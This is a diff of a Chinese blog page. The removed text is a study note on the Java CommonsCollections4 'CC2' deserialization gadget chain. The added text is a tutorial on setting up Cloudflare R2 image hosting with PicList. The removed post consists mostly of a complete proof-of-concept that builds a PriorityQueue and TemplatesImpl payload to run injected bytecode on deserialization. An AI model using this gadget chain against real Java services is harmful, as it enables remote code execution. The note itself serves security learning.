@@ -18,25 +18,35 @@
   <meta name="author" content="Sp4rks3">
   <meta name="keywords" content="博客">
   
-    <meta name="description" content="前言CC3中我们了解到TemplatesImpl()调用Transformer()方法就可以代码执行。 CC2就在在这个基础上，结合CC4改写。CC2最大的优势就是不用Transformer 数组。 环境搭建 JDK8u65 CommonsCollections4  1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt;group">
+    <meta name="description" content="前言之前博客都是通过GitHub实现图床的，但是国内访问图片的速度实在是不敢恭维；另外GitHub其实是不允许做图床的，当库超过1G以后会有人工审查，发现是图床可能会删库，甚至封帐号； 前期解决方案总体来看有几个解决方法 阿里云oss	腾讯云cos	七牛云	又拍云 七牛云有免费的额度，也可以使用不备案的域名，但是这样的话图片速度比Github还慢 又拍云需要网站备案，加入又拍云联盟才有免费额度，又">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java反序列化CommonsCollections篇-CC2">
-<meta property="og:url" content="https://sp4rks3.github.io/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC2/index.html">
+<meta property="og:title" content="利用cloudflare R2搭建图床">
+<meta property="og:url" content="https://sp4rks3.github.io/2024/06/28/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E5%88%A9%E7%94%A8cloudflare%20R2%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/index.html">
 <meta property="og:site_name" content="Sp4rks3&#39;s Blog">
-<meta property="og:description" content="前言CC3中我们了解到TemplatesImpl()调用Transformer()方法就可以代码执行。 CC2就在在这个基础上，结合CC4改写。CC2最大的优势就是不用Transformer 数组。 环境搭建 JDK8u65 CommonsCollections4  1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt;group">
+<meta property="og:description" content="前言之前博客都是通过GitHub实现图床的，但是国内访问图片的速度实在是不敢恭维；另外GitHub其实是不允许做图床的，当库超过1G以后会有人工审查，发现是图床可能会删库，甚至封帐号； 前期解决方案总体来看有几个解决方法 阿里云oss	腾讯云cos	七牛云	又拍云 七牛云有免费的额度，也可以使用不备案的域名，但是这样的话图片速度比Github还慢 又拍云需要网站备案，加入又拍云联盟才有免费额度，又">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/CC2.png">
-<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240602022510898.png">
-<meta property="article:published_time" content="2024-06-01T18:26:15.848Z">
-<meta property="article:modified_time" content="2024-06-28T09:27:26.540Z">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628145013147.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628145259856.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628145524103.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628151002609.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628144516183.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628144701802.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628151346032.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628151514382.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628151750145.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628151925647.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628152607640.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/06/image-20240628153202851.png">
+<meta property="article:published_time" content="2024-06-28T08:59:38.055Z">
+<meta property="article:modified_time" content="2024-06-28T09:35:09.413Z">
 <meta property="article:author" content="Sp4rks3">
-<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="奇技淫巧">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://image.sp4rks.xyz/2024/06/CC2.png">
+<meta name="twitter:image" content="https://image.sp4rks.xyz/2024/06/image-20240628145013147.png">
   
   
   
-  <title>Java反序列化CommonsCollections篇-CC2 - Sp4rks3&#39;s Blog</title>
+  <title>利用cloudflare R2搭建图床 - Sp4rks3&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +212,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Java反序列化CommonsCollections篇-CC2"></span>
+            <span id="subtitle" data-typed-text="利用cloudflare R2搭建图床"></span>
           
         </div>
 
@@ -213,8 +223,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-06-02 02:26" pubdate>
-          2024年6月2日 凌晨
+        <time datetime="2024-06-28 16:59" pubdate>
+          2024年6月28日 下午
         </time>
       </span>
     
@@ -225,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          449 字
+          1.1k 字
         
       </span>
     
@@ -236,7 +246,7 @@
         
         
         
-          4 分钟
+          10 分钟
         
       </span>
     
@@ -273,27 +283,145 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Java反序列化CommonsCollections篇-CC2</h1>
+            <h1 id="seo-header">利用cloudflare R2搭建图床</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC3中我们了解到<code>TemplatesImpl()</code>调用<code>Transformer()</code>方法就可以代码执行。</p>
-<p>CC2就在在这个基础上，结合CC4改写。CC2最大的优势就是不用<code>Transformer</code> 数组。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
-<li>JDK8u65</li>
-<li>CommonsCollections4</li>
-</ul>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="CC2调用链分析"><a href="#CC2调用链分析" class="headerlink" title="CC2调用链分析"></a>CC2调用链分析</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" srcset="/img/loading.gif" lazyload alt="CC2"></p>
-<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-comment">//和CC4一样</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>		<span class="hljs-comment">//构造InvokerTransformer类去调用templates对象的newTransformer()方法</span><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-comment">//创建TransformingComparator类对象，传⼊一个临时的Transformer类对象(ConstantTransformer)，让代码序列化的时候不执行，在反序列化的时候执行。</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <br>        <br>        <span class="hljs-comment">//创建 PriorityQueue类对象传入transformingComparator对象，但是此时向队列⾥添加的元素就是我们前⾯创建的 TemplatesImpl对象了，这是因为最后调用 PriorityQueue.compare() 的时候是传入队列中的两个对象，然后 compare()中调用 Transformer.transform(obj1) 的时候用的是传入的第一个对象作为参数，因此这里需要将priorityQueue队列中的第一个对象设置为构造好的 templates 对象。</span><br>        <span class="hljs-comment">//PriorityQueue调用TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602022510898.png" srcset="/img/loading.gif" lazyload alt="image-20240602022510898"></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
-<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">Java反序列化Commons-Collections篇05-CC2链</a></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前博客都是通过GitHub实现图床的，但是国内访问图片的速度实在是不敢恭维；另外GitHub其实是不允许做图床的，当库超过1G以后会有人工审查，发现是图床可能会删库，甚至封帐号；</p>
+<h2 id="前期解决方案"><a href="#前期解决方案" class="headerlink" title="前期解决方案"></a>前期解决方案</h2><p>总体来看有几个解决方法</p>
+<p>阿里云oss	腾讯云cos	七牛云	又拍云</p>
+<p>七牛云有免费的额度，也可以使用不备案的域名，但是这样的话图片速度比Github还慢</p>
+<p>又拍云需要网站备案，加入又拍云联盟才有免费额度，又拍云联盟需要在你的网站上加上他们的广告和需要手持证件照拍照审核</p>
+<p>综上，前期我用的第一个解决方案是腾讯云的cos桶，类似的还有阿里云的oss，价格其实也不贵</p>
+<p>但是当我部署完了，去浏览器打开图片连接发现，浏览器会自动下载图片，不能预览，翻了半天cos介绍才知道，域名没备案的不支持预览，浏览器打开连接就直接下载了。用了一段时间，虽然没啥大问题，但是总感觉不爽。</p>
+<p>总体来说上面的方案都需要备案才能有良好的使用体验。</p>
+<p>于是最后转向了<strong>Cloudflare</strong>的怀抱</p>
+<p>优势是：</p>
+<p>网站不需要备案，有免费额度</p>
+<p>图片响应速度快</p>
+<p><strong>R2 定价</strong></p>
+<table>
+<thead>
+<tr>
+<th>ㅤ</th>
+<th>免费</th>
+<th>超出部分&#x2F;月费</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>存储</td>
+<td>10 GB&#x2F;月</td>
+<td>0.015 美元&#x2F;GB</td>
+</tr>
+<tr>
+<td>A 类操作</td>
+<td>100 万次&#x2F;月</td>
+<td>4.50 美元&#x2F;百万次</td>
+</tr>
+<tr>
+<td>B 类操作</td>
+<td>1000 万次&#x2F;月</td>
+<td>0.36 美元&#x2F;百万次</td>
+</tr>
+</tbody></table>
+<h2 id="使用Cloudflare-R2的前期准备"><a href="#使用Cloudflare-R2的前期准备" class="headerlink" title="使用Cloudflare R2的前期准备"></a>使用Cloudflare R2的前期准备</h2><p><a target="_blank" rel="noopener" href="https://github.com/Kuingsmile/PicList">PicList</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.paypal.com/">paypal</a></p>
+<p>域名(可不备案)</p>
+<hr>
+<p>首先需要把你的域名添加到<strong>Cloudflare</strong></p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145013147.png" srcset="/img/loading.gif" lazyload alt="image-20240628145013147"></p>
+<p>选择免费的计划就行，随后会分配两个dns服务器</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145259856.png" srcset="/img/loading.gif" lazyload alt="image-20240628145259856"></p>
+<p>直接去域名的服务商那里改成这<strong>Cloudflare</strong>的DNS地址</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145524103.png" srcset="/img/loading.gif" lazyload alt="image-20240628145524103"></p>
+<p>另外使用CF之后发现，网站加载速度很慢。把A记录和CNAME设置为仅DNS就行</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151002609.png" srcset="/img/loading.gif" lazyload alt="image-20240628151002609"></p>
+<h2 id="第一个坑点"><a href="#第一个坑点" class="headerlink" title="第一个坑点"></a>第一个坑点</h2><p>其实之前很早就了解<strong>Cloudflare</strong>了，上去看了一下，有很多自己不是很了解的东西，就留在温柔乡了。。。继续使用cos桶；另一个问题是之前听过创建R2存储用paypal就行，但是我上去看必须要信用卡，遂放弃。</p>
+<p>偶然发现是梯子的问题</p>
+<p>个人习惯梯子开机自启，习惯谷歌，杜绝百度</p>
+<p>可以看到并没有出现paypal的选项</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144516183.png" srcset="/img/loading.gif" lazyload alt="image-20240628144516183"></p>
+<p>不开梯子就可以使用paypal付款了</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144701802.png" srcset="/img/loading.gif" lazyload alt="image-20240628144701802"></p>
+<h2 id="创建存储桶"><a href="#创建存储桶" class="headerlink" title="创建存储桶"></a>创建存储桶</h2><p>位置选择 亚太地区</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151346032.png" srcset="/img/loading.gif" lazyload alt="image-20240628151346032"></p>
+<p>R2创建完之后，设置连接域名，输入刚刚添加的域名的三级域名，比如 a.com 写为image.a.com，<strong>Cloudflare</strong>会自动添加记录，用这个域名就可以访问R2存储的内容</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151514382.png" srcset="/img/loading.gif" lazyload alt="image-20240628151514382"></p>
+<p>接着添加一个管理令牌</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151750145.png" srcset="/img/loading.gif" lazyload alt="image-20240628151750145"></p>
+<p>剩下的默认即可</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151925647.png" srcset="/img/loading.gif" lazyload alt="image-20240628151925647"></p>
+<h2 id="PicList不能同步闪出云端图片的解决方案"><a href="#PicList不能同步闪出云端图片的解决方案" class="headerlink" title="PicList不能同步闪出云端图片的解决方案"></a>PicList不能同步闪出云端图片的解决方案</h2><p>严格按照如图所示位置填写</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628152607640.png" srcset="/img/loading.gif" lazyload alt="image-20240628152607640"></p>
+<p>上传路径可以根据表自己组合填写</p>
+<table>
+<thead>
+<tr>
+<th align="center">payload</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>&#123;year&#125;</code></td>
+<td align="center">当前日期 - 年</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;month&#125;</code></td>
+<td align="center">当前日期 - 月</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;day&#125;</code></td>
+<td align="center">当前日期 - 日</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;fullName&#125;</code></td>
+<td align="center">完整文件名（含扩展名）</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;fileName&#125;</code></td>
+<td align="center">文件名（不含扩展名）</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;extName&#125;</code></td>
+<td align="center">扩展名（不含.）</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;md5&#125;</code></td>
+<td align="center">图片 MD5 计算值</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;sha1&#125;</code></td>
+<td align="center">图片 SHA1 计算值</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;sha256&#125;</code></td>
+<td align="center">图片 SHA256 计算值</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;timestamp&#125;</code></td>
+<td align="center">Unix 时间戳</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;timestampMS&#125;</code></td>
+<td align="center">Unix 时间戳（毫秒）</td>
+</tr>
+</tbody></table>
+<p>地区因为选择亚太地区所有填写 apac</p>
+<p><strong>自定义域名写刚刚的三级域名如:<a target="_blank" rel="noopener" href="http://image.a.com/">http://image.a.com</a></strong></p>
+<hr>
+<h3 id="踩坑原因"><a href="#踩坑原因" class="headerlink" title="踩坑原因"></a>踩坑原因</h3><p>之前设置<strong>PicList</strong>自定义节点使用了这个 S3 API，它其实和上图管辖地址只差一个存储桶的名字 </p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628153202851.png" srcset="/img/loading.gif" lazyload alt="image-20240628153202851"></p>
+<p>而且可以上传图片，但是图片在typora加载会失败</p>
+<p>随后将<strong>PicList</strong>自定义域名<a target="_blank" rel="noopener" href="http://image.a.com,改为http//image.a.com/blog1">http://image.a.com，改为http://image.a.com/blog1</a></p>
+<p>图片显示正常</p>
+<p>用了一段时间才发现<strong>PicList</strong>不能同步删除云端图片，看日志没有看到删除记录</p>
+<p>最开始谷歌半天找不到，随后找到这个issuse:<a target="_blank" rel="noopener" href="https://github.com/Kuingsmile/PicList/issues/203%E6%89%8D%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98">https://github.com/Kuingsmile/PicList/issues/203才解决这个问题</a></p>
+<p>随后<strong>PicList</strong>也可以正常的删除云端的图片了</p>
+<p><strong>(浪费贼多时间去谷歌，看来下次遇到问题得先去看issuse)</strong></p>
+<h2 id="🤗Enjoy！"><a href="#🤗Enjoy！" class="headerlink" title="🤗Enjoy！"></a>🤗Enjoy！</h2><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a target="_blank" rel="noopener" href="https://developers.cloudflare.com/r2/">Cloudflare R2 · Cloudflare R2 docs</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Kuingsmile/PicList/issues/203">Bug无法同步删除云端 #203</a></p>
+<p><a target="_blank" rel="noopener" href="https://piclist.cn/app">PicList文档</a></p>
 
                 
               </div>
@@ -312,7 +440,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/JAVA/" class="category-chain-item">JAVA</a>
+  <a href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" class="category-chain-item">奇技淫巧</a>
   
   
 
@@ -327,7 +455,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" class="print-no-link">#JAVA安全</a>
+        <a href="/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" class="print-no-link">#奇技淫巧</a>
       
     </div>
   
@@ -339,8 +467,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Java反序列化CommonsCollections篇-CC2</div>
-      <div>https://sp4rks3.github.io/2024/06/02/JAVA安全/CC2/</div>
+      <div>利用cloudflare R2搭建图床</div>
+      <div>https://sp4rks3.github.io/2024/06/28/奇技淫巧/利用cloudflare R2搭建图床/</div>
     </div>
     <div class="license-meta">
       
@@ -352,7 +480,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年6月2日</div>
+          <div>2024年6月28日</div>
         </div>
       
       
@@ -384,18 +512,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC5/" title="Java反序列化CommonsCollections篇-CC5">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Java反序列化CommonsCollections篇-CC5</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/06/01/JAVA%E5%AE%89%E5%85%A8/CC4/" title="Java反序列化CommonsCollections篇-CC4">
-                        <span class="hidden-mobile">Java反序列化CommonsCollections篇-CC4</span>
+                      <a href="/2024/06/09/JAVA%E5%AE%89%E5%85%A8/Shiro550/" title="Java反序列化Shiro 550分析">
+                        <span class="hidden-mobile">Java反序列化Shiro 550分析</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
